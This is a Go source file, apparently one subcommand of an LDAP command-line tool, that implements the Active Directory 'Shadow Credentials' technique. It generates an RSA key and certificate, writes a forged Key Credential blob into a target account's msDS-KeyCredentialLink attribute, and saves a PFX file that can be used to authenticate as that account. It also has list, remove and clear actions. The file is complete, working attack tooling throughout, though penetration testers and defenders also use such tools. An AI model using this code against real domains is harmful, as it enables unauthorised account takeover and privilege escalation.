package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/binary"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"math/big"
	"os"
	"strings"
	"time"

	"github.com/google/uuid"
	ldap "github.com/jfjallid/ldap/v3"
	"software.sslmate.com/src/go-pkcs12"
)

var helpShadowOptions = `
    Usage: ldaptool shadow-credentials [options]

    Shadow credentials options:
          --action     Action: add, list, remove, clear (required)
          --target     sAMAccountName of target account (required)
          --device-id  Device ID to remove (for 'remove' action)
          --out        Output PFX file path (default: <target>.pfx)
          --pfx-pass   PFX file password (default: empty)
` + helpConnectionOptions

// Key Credential TLV entry types (MS-ADTS 2.2.20)
const (
	kcEntryKeyID         = 0x01
	kcEntryKeyHash       = 0x02
	kcEntryKeyMaterial   = 0x03
	kcEntryKeyUsage      = 0x04
	kcEntryKeySource     = 0x05
	kcEntryDeviceID      = 0x06
	kcEntryCustomKeyInfo = 0x07
	kcEntryLastLogonTime = 0x08
	kcEntryCreationTime  = 0x09
)

// Key Credential version
const kcVersion = 0x00000200

// Windows epoch offset: 100-nanosecond intervals between 1601-01-01 and 1970-01-01
const windowsEpochDiff = 116444736000000000

type shadowCredsCmd struct {
	action   string
	target   string
	deviceID string
	outFile  string
	pfxPass  string
}

func init() { register(&shadowCredsCmd{}) }

func (c *shadowCredsCmd) Name() string     { return "shadow-credentials" }
func (c *shadowCredsCmd) Synopsis() string { return "Manage msDS-KeyCredentialLink (Shadow Credentials)" }
func (c *shadowCredsCmd) Usage() string    { return helpShadowOptions }

func (c *shadowCredsCmd) DefineFlags(f *flag.FlagSet) {
	f.StringVar(&c.action, "action", "", "Action: add, list, remove, clear (required)")
	f.StringVar(&c.target, "target", "", "sAMAccountName of target account (required)")
	f.StringVar(&c.deviceID, "device-id", "", "Device ID to remove (for 'remove' action)")
	f.StringVar(&c.outFile, "out", "", "Output PFX file path (default: <target>.pfx)")
	f.StringVar(&c.pfxPass, "pfx-pass", "", "PFX file password")
}

func (c *shadowCredsCmd) Run(a *connArgs) error {
	if err := ensurePassword(a); err != nil {
		return fmt.Errorf("reading password: %w", err)
	}
	conn, baseDN, err := makeConnection(a)
	if err != nil {
		return err
	}
	defer conn.Close()
	return runShadowCredentials(conn, baseDN, c)
}

func runShadowCredentials(conn *ldap.Conn, baseDN string, c *shadowCredsCmd) error {
	if c.action == "" || c.target == "" {
		return fmt.Errorf("--action and --target are required for shadow-credentials")
	}
	switch c.action {
	case "add":
		return shadowAdd(conn, baseDN, c.target, c.outFile, c.pfxPass)
	case "list":
		return shadowList(conn, baseDN, c.target)
	case "remove":
		if c.deviceID == "" {
			return fmt.Errorf("--device-id is required for 'remove' action")
		}
		return shadowRemove(conn, baseDN, c.target, c.deviceID)
	case "clear":
		return shadowClear(conn, baseDN, c.target)
	}
	return fmt.Errorf("unknown action %q (valid: add, list, remove, clear)", c.action)
}

// packTLVEntry packs a single TLV entry: [2-byte length LE][1-byte type][value]
func packTLVEntry(entryType byte, value []byte) []byte {
	buf := make([]byte, 2+1+len(value))
	binary.LittleEndian.PutUint16(buf[0:2], uint16(len(value)))
	buf[2] = entryType
	copy(buf[3:], value)
	return buf
}

// windowsTicksNow returns the current time as Windows FILETIME ticks.
func windowsTicksNow() uint64 {
	return uint64(time.Now().UnixNano()/100) + windowsEpochDiff
}

// windowsTicksToTime converts Windows FILETIME ticks to time.Time. Ticks
// before the Unix epoch (i.e. pre-1970) are clamped to the zero Time to
// avoid uint64 subtraction underflow.
func windowsTicksToTime(ticks uint64) time.Time {
	if ticks < windowsEpochDiff {
		return time.Time{}
	}
	unixNano := int64(ticks-windowsEpochDiff) * 100
	return time.Unix(0, unixNano)
}

// buildBCryptRSAKeyBlob encodes an RSA public key in BCRYPT_RSAKEY_BLOB format.
func buildBCryptRSAKeyBlob(pub *rsa.PublicKey) []byte {
	exponent := big.NewInt(int64(pub.E)).Bytes()
	modulus := pub.N.Bytes()

	buf := make([]byte, 24+len(exponent)+len(modulus))
	copy(buf[0:4], []byte("RSA1"))
	binary.LittleEndian.PutUint32(buf[4:8], uint32(pub.N.BitLen()))
	binary.LittleEndian.PutUint32(buf[8:12], uint32(len(exponent)))
	binary.LittleEndian.PutUint32(buf[12:16], uint32(len(modulus)))
	copy(buf[24:], exponent)
	copy(buf[24+len(exponent):], modulus)
	return buf
}

// buildKeyCredentialBlob constructs the full Key Credential binary blob.
func buildKeyCredentialBlob(pub *rsa.PublicKey) ([]byte, uuid.UUID) {
	rawKeyMaterial := buildBCryptRSAKeyBlob(pub)
	deviceID := uuid.New()
	now := windowsTicksNow()

	var nowBuf [8]byte
	binary.LittleEndian.PutUint64(nowBuf[:], now)

	var properties []byte
	properties = append(properties, packTLVEntry(kcEntryKeyMaterial, rawKeyMaterial)...)
	properties = append(properties, packTLVEntry(kcEntryKeyUsage, []byte{0x01})...)
	properties = append(properties, packTLVEntry(kcEntryKeySource, []byte{0x00})...)
	properties = append(properties, packTLVEntry(kcEntryDeviceID, deviceID[:])...)
	properties = append(properties, packTLVEntry(kcEntryCustomKeyInfo, []byte{0x01, 0x00})...)
	properties = append(properties, packTLVEntry(kcEntryLastLogonTime, nowBuf[:])...)
	properties = append(properties, packTLVEntry(kcEntryCreationTime, nowBuf[:])...)

	keyHash := sha256.Sum256(properties)
	keyID := sha256.Sum256(rawKeyMaterial)

	var data []byte
	data = append(data, packTLVEntry(kcEntryKeyID, keyID[:])...)
	data = append(data, packTLVEntry(kcEntryKeyHash, keyHash[:])...)

	var blob []byte
	var versionBuf [4]byte
	binary.LittleEndian.PutUint32(versionBuf[:], kcVersion)
	blob = append(blob, versionBuf[:]...)
	blob = append(blob, data...)
	blob = append(blob, properties...)

	return blob, deviceID
}

// parsedKeyCredential holds parsed fields from a Key Credential blob.
type parsedKeyCredential struct {
	DeviceID     string
	CreationTime time.Time
	KeyID        string
}

// parseKeyCredentialBlob parses a Key Credential binary blob.
func parseKeyCredentialBlob(data []byte) (parsedKeyCredential, error) {
	var result parsedKeyCredential

	if len(data) < 4 {
		return result, fmt.Errorf("blob too short: %d bytes", len(data))
	}

	version := binary.LittleEndian.Uint32(data[0:4])
	if version != kcVersion {
		return result, fmt.Errorf("unexpected version: 0x%x", version)
	}

	offset := 4
	for offset < len(data) {
		if offset+3 > len(data) {
			break
		}
		length := int(binary.LittleEndian.Uint16(data[offset : offset+2]))
		entryType := data[offset+2]
		offset += 3

		if offset+length > len(data) {
			return result, fmt.Errorf("entry type 0x%x: length %d exceeds data", entryType, length)
		}

		value := data[offset : offset+length]
		offset += length

		switch entryType {
		case kcEntryDeviceID:
			if length == 16 {
				uid, err := uuid.FromBytes(value)
				if err == nil {
					result.DeviceID = uid.String()
				} else {
					result.DeviceID = hex.EncodeToString(value)
				}
			}
		case kcEntryCreationTime:
			if length == 8 {
				ticks := binary.LittleEndian.Uint64(value)
				result.CreationTime = windowsTicksToTime(ticks)
			}
		case kcEntryKeyID:
			result.KeyID = hex.EncodeToString(value)
		}
	}

	return result, nil
}

// toDNWithBinary formats a binary blob and owner DN in the DN-with-Binary syntax.
func toDNWithBinary(blob []byte, ownerDN string) string {
	hexStr := strings.ToUpper(hex.EncodeToString(blob))
	return fmt.Sprintf("B:%d:%s:%s", len(hexStr), hexStr, ownerDN)
}

// parseDNWithBinary parses a DN-with-Binary value into its binary blob and DN parts.
func parseDNWithBinary(value string) ([]byte, string, error) {
	if !strings.HasPrefix(value, "B:") && !strings.HasPrefix(value, "b:") {
		return nil, "", fmt.Errorf("not a DN-with-Binary value: missing B: prefix")
	}

	rest := value[2:]
	parts := strings.SplitN(rest, ":", 3)
	if len(parts) < 3 {
		return nil, "", fmt.Errorf("invalid DN-with-Binary format")
	}

	hexCharCount := 0
	if _, err := fmt.Sscanf(parts[0], "%d", &hexCharCount); err != nil {
		return nil, "", fmt.Errorf("invalid hex char count: %s", parts[0])
	}

	remainder := parts[1] + ":" + parts[2]
	if len(remainder) < hexCharCount+1 {
		return nil, "", fmt.Errorf("hex data shorter than declared count")
	}

	hexStr := remainder[:hexCharCount]
	dn := remainder[hexCharCount+1:]

	blob, err := hex.DecodeString(hexStr)
	if err != nil {
		return nil, "", fmt.Errorf("invalid hex data: %w", err)
	}

	return blob, dn, nil
}

// generateShadowCredential generates an RSA key pair, self-signed certificate,
// and Key Credential blob for shadow credentials.
func generateShadowCredential(targetName string) (*rsa.PrivateKey, *x509.Certificate, []byte, uuid.UUID, error) {
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, nil, nil, uuid.UUID{}, fmt.Errorf("RSA key generation failed: %w", err)
	}

	serial, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	if err != nil {
		return nil, nil, nil, uuid.UUID{}, fmt.Errorf("serial generation failed: %w", err)
	}

	now := time.Now()
	template := &x509.Certificate{
		SerialNumber: serial,
		Subject:      pkix.Name{CommonName: targetName},
		NotBefore:    now,
		NotAfter:     now.Add(365 * 24 * time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature,
	}

	certDER, err := x509.CreateCertificate(rand.Reader, template, template, &key.PublicKey, key)
	if err != nil {
		return nil, nil, nil, uuid.UUID{}, fmt.Errorf("certificate creation failed: %w", err)
	}

	cert, err := x509.ParseCertificate(certDER)
	if err != nil {
		return nil, nil, nil, uuid.UUID{}, fmt.Errorf("certificate parse failed: %w", err)
	}

	blob, deviceID := buildKeyCredentialBlob(&key.PublicKey)
	return key, cert, blob, deviceID, nil
}

// exportPFX encodes a private key and certificate as a PKCS#12 (PFX) file.
func exportPFX(r io.Reader, key *rsa.PrivateKey, cert *x509.Certificate, password string) ([]byte, error) {
	return pkcs12.Encode(r, key, cert, nil, password)
}

// lookupTarget searches for an account by sAMAccountName and returns its DN
// and current msDS-KeyCredentialLink values.
func lookupTarget(conn *ldap.Conn, baseDN, samAccountName string) (string, []string, error) {
	filter := fmt.Sprintf("(sAMAccountName=%s)", ldap.EscapeFilter(samAccountName))
	result, err := conn.Search(ldap.NewSearchRequest(
		baseDN,
		ldap.ScopeWholeSubtree,
		ldap.NeverDerefAliases,
		0, 0, false,
		filter,
		[]string{"distinguishedName", "sAMAccountName", "msDS-KeyCredentialLink"},
		nil,
	))
	if err != nil {
		return "", nil, fmt.Errorf("LDAP search failed: %w", err)
	}
	if len(result.Entries) == 0 {
		return "", nil, fmt.Errorf("account %q not found", samAccountName)
	}
	if len(result.Entries) > 1 {
		return "", nil, fmt.Errorf("multiple accounts found for %q", samAccountName)
	}

	entry := result.Entries[0]
	dn := entry.DN
	existing := entry.GetAttributeValues("msDS-KeyCredentialLink")
	return dn, existing, nil
}

func shadowAdd(conn *ldap.Conn, baseDN, target, outFile, pfxPass string) error {
	dn, _, err := lookupTarget(conn, baseDN, target)
	if err != nil {
		return fmt.Errorf("target lookup: %w", err)
	}
	key, cert, blob, deviceID, err := generateShadowCredential(target)
	if err != nil {
		return fmt.Errorf("credential generation: %w", err)
	}
	dnBinValue := toDNWithBinary(blob, dn)
	modReq := ldap.NewModifyRequest(dn, nil)
	modReq.Add("msDS-KeyCredentialLink", []string{dnBinValue})
	if err := conn.Modify(modReq); err != nil {
		return fmt.Errorf("LDAP modify: %w", err)
	}
	pfxData, err := exportPFX(rand.Reader, key, cert, pfxPass)
	if err != nil {
		return fmt.Errorf("PFX export: %w", err)
	}
	if outFile == "" {
		outFile = target + ".pfx"
	}
	if err := os.WriteFile(outFile, pfxData, 0600); err != nil {
		return fmt.Errorf("write PFX: %w", err)
	}
	fmt.Printf("Shadow credential added to %s\n", dn)
	fmt.Printf("  Device ID:  %s\n", deviceID.String())
	fmt.Printf("  PFX file:   %s\n", outFile)
	if pfxPass == "" {
		fmt.Printf("  PFX pass:   (empty)\n")
	}
	return nil
}

func shadowList(conn *ldap.Conn, baseDN, target string) error {
	dn, existing, err := lookupTarget(conn, baseDN, target)
	if err != nil {
		return fmt.Errorf("target lookup: %w", err)
	}
	fmt.Printf("Key credentials for %s:\n", dn)
	if len(existing) == 0 {
		fmt.Println("  (none)")
		return nil
	}
	for i, val := range existing {
		blob, _, parseErr := parseDNWithBinary(val)
		if parseErr != nil {
			fmt.Printf("  [%d] (parse error: %v)\n", i, parseErr)
			continue
		}
		parsed, parseErr := parseKeyCredentialBlob(blob)
		if parseErr != nil {
			fmt.Printf("  [%d] (blob parse error: %v)\n", i, parseErr)
			continue
		}
		fmt.Printf("  [%d] DeviceID: %s  Created: %s\n", i, parsed.DeviceID, parsed.CreationTime.UTC().Format(time.RFC3339))
	}
	return nil
}

func shadowRemove(conn *ldap.Conn, baseDN, target, removeDeviceID string) error {
	dn, existing, err := lookupTarget(conn, baseDN, target)
	if err != nil {
		return fmt.Errorf("target lookup: %w", err)
	}
	removeDeviceID = strings.ToLower(removeDeviceID)
	var kept []string
	found := false
	for _, val := range existing {
		blob, _, parseErr := parseDNWithBinary(val)
		if parseErr != nil {
			kept = append(kept, val)
			continue
		}
		parsed, parseErr := parseKeyCredentialBlob(blob)
		if parseErr != nil {
			kept = append(kept, val)
			continue
		}
		if strings.ToLower(parsed.DeviceID) == removeDeviceID {
			found = true
			continue
		}
		kept = append(kept, val)
	}
	if !found {
		return fmt.Errorf("device ID %s not found in key credentials for %s", removeDeviceID, target)
	}
	modReq := ldap.NewModifyRequest(dn, nil)
	if len(kept) == 0 {
		// Prefer the 'delete' op with no values over 'replace' + empty list;
		// Windows accepts both but RFC 4511 says remove-all is a Delete.
		modReq.Delete("msDS-KeyCredentialLink", []string{})
	} else {
		modReq.Replace("msDS-KeyCredentialLink", kept)
	}
	if err := conn.Modify(modReq); err != nil {
		return fmt.Errorf("LDAP modify: %w", err)
	}
	fmt.Printf("Removed key credential with Device ID %s from %s\n", removeDeviceID, dn)
	return nil
}

func shadowClear(conn *ldap.Conn, baseDN, target string) error {
	dn, existing, err := lookupTarget(conn, baseDN, target)
	if err != nil {
		return fmt.Errorf("target lookup: %w", err)
	}
	if len(existing) == 0 {
		fmt.Printf("No key credentials to clear on %s\n", dn)
		return nil
	}
	modReq := ldap.NewModifyRequest(dn, nil)
	modReq.Delete("msDS-KeyCredentialLink", []string{})
	if err := conn.Modify(modReq); err != nil {
		return fmt.Errorf("LDAP modify: %w", err)
	}
	fmt.Printf("Cleared %d key credential(s) from %s\n", len(existing), dn)
	return nil
}
